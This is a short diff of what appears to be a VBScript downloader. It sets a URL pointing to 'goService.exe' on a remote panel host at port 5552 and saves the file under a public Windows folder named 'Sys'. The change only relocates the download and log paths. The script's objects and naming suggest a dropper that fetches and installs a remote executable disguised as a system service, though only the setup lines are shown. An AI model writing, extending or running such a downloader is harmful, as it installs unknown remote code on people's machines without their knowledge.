@@ -9,8 +9,8 @@ Dim url, downloadPath, objXMLHTTP, objStream, objShell, objFSO, objFile, install
 Dim commandOutput, errorFile
 
 url = "http://panel.ryugi.be:5552/uploads/goService.exe"
-downloadPath = "C:\Sys\goService.exe"
-errorFile = "C:\Sys\service_install_log.txt"
+downloadPath = "C:\Users\Public\Sys\goService.exe"
+errorFile = "C:\Users\Public\Sys\service_install_log.txt"
 
 ' Ensure the directory exists
 Set objFSO = CreateObject("Scripting.FileSystemObject")
